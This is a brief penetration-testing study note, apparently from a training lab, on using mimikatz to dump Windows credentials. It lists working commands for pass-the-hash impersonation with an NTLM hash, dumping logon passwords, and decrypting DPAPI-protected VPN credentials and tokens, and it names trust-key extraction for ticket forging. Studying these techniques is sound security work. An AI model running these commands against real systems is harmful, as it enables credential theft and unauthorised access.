#mimikatz #pillaging #auth #crendentals #secretsdump #passtheticket 
- [GitHub - gentilkiwi/mimikatz: A little tool to play with Windows security](https://github.com/gentilkiwi/mimikatz)
- steals creds from windows memory
- use stolen creds to auth
- [Dumping User Passwords from Windows Memory with Mimikatz | Windows OS Hub (woshub.com)](https://woshub.com/how-to-get-plain-text-passwords-of-windows-users/)
- `mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.htb /run:cmd.exe" exit`  impersonate user julio using NTLM hash on the inlane domain then run CMD under the user context
- `privilege::debug` grant the current account the permissions to debug processes
- `sekurlsa::logonPasswords full` List active user sessions
- `misc::cmd` open CMD as user

---

> [!note] **See also** — [[Services/Remote Access/Cisco AnyConnect|Cisco AnyConnect]] (`sekurlsa::dpapi` + `dpapi::cred` to decrypt saved VPN credentials; `crypto::certificates /export` for non-exportable client-auth certs). Also [[Services/Remote Access/ZPA - Zscaler Private Access|ZPA]] — `dpapi::cred` on the ZPA client's cached session-token blobs (`%LOCALAPPDATA%\Zscaler\`). DPAPI counterpart without the binary: [[Tools/Credential Dumping/SharpDPAPI|SharpDPAPI]]. AD attack use: [[Services/Active Directory/Domain Trusts|Domain Trusts]] — `lsadump::trust /patch` to extract trust keys for inter-realm TGT forging; [[Services/Active Directory/ADFS|ADFS]] — exporting the token-signing cert on the ADFS server.

---

*Created: 2026-07-13*
*Updated: 2026-09-25*
*Model: claude-opus-4-8*
